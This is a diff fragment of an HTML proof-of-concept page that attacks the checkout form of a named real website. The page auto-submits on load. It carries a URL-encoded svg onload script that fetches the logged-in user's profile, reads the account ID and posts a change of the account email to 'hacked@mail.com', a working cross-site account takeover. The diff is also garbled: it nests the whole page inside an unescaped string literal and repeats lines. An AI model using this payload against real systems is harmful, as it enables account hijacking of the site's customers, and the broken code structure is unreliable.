@@ -13,8 +13,29 @@
   </form>
 
   <script>
+const encoded="<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CSRF PoC – Change Order Code</title>
+</head>
+<body>
+  <form id="csrfForm" action="https://www.familyhomeplans.com/checkout/review.cfm" method="POST">
+    <!-- These hidden inputs replicate exactly what the legitimate form sends -->
+    <input id="OrderCode" type="hidden" name="OrderCode"   value="">
+    <input type="hidden" name="PromoCode"   value="">
+    <input type="hidden" name="saveordercode" value="1">
+  </form>
+
+  <script>
 const encoded="%22%3E%3Csvg%20visibility%3D%22hidden%22%20onload%3D%22(async%28%29%3D%3E%7Bconst%20r%3Dawait%20fetch%28'/mypage.cfm%3Ftab%3D2'%2C%7Bcredentials%3A'include'%7D%29%2Ch%3Dawait%20r.text%28%29%2Cdoc%3Dnew%20DOMParser%28%29.parseFromString%28h%2C'text%2Fhtml'%29%2Cf%3Ddoc.getElementsByName%28'ID'%29%5B0%5D%3Bif%28!f%29return%3Bconst%20i%3Df.value%2Cfd%3Dnew%20URLSearchParams%28%29%3Bfd.set%28'Notes'%2C''%29%3Bfd.set%28'x_first_name'%2C''%29%3Bfd.set%28'x_last_name'%2C''%29%3Bfd.set%28't_company'%2C''%29%3Bfd.set%28'x_address'%2C''%29%3Bfd.set%28'x_city'%2C''%29%3Bfd.set%28'x_state'%2C''%29%3Bfd.set%28'x_zip'%2C''%29%3Bfd.set%28'x_country'%2C'US'%29%3Bfd.set%28'x_phone'%2C''%29%3Bfd.set%28'x_email'%2C'hacked%40mail.com'%29%3Bfd.set%28'x_ship_to_first_name'%2C''%29%3Bfd.set%28'x_ship_to_last_name'%2C''%29%3Bfd.set%28't_ship_to_company'%2C''%29%3Bfd.set%28'x_ship_to_address'%2C''%29%3Bfd.set%28'x_ship_to_city'%2C''%29%3Bfd.set%28'x_ship_to_state'%2C''%29%3Bfd.set%28'x_ship_to_zip'%2C''%29%3Bfd.set%28'x_ship_to_country'%2C'US'%29%3Bfd.set%28'x_ship_to_phone'%2C''%29%3Bfd.set%28'x_occupation'%2C'1'%29%3Bfd.set%28'license_num'%2C''%29%3Bfd.set%28'saveprofile'%2C'1'%29%3Bfd.set%28'ID'%2Ci%29%3Bfd.set%28't_x_email'%2C'hacked%40mail.com'%29%3Bfd.set%28'enter_button'%2C'Save%20Address%20Info'%29%3Bfetch%28'/edit_mypage.cfm'%2C%7Bmethod%3A'POST'%2Ccredentials%3A'include'%2Cheaders%3A%7B'Content-Type'%3A'application%2Fx-www-form-urlencoded'%7D%2Cbody%3Afd.toString%28%29%7D%29.then%28res%3D%3Econsole.log%28'CSRF'%2Cres.status%29%29%3B%7D%29%28%29%22%3E%3C%2Fsvg%3E";
     const payload = decodeURIComponent(encoded);
+    document.getElementById('OrderCode').value = payload;
+    // Immediately submit when the page loads
+    document.getElementById('csrfForm').submit();
+  </script>
+</body>
+</html>";    const payload = decodeURIComponent(encoded);
     document.getElementById('OrderCode').value = payload;
     // Immediately submit when the page loads
     document.getElementById('csrfForm').submit();
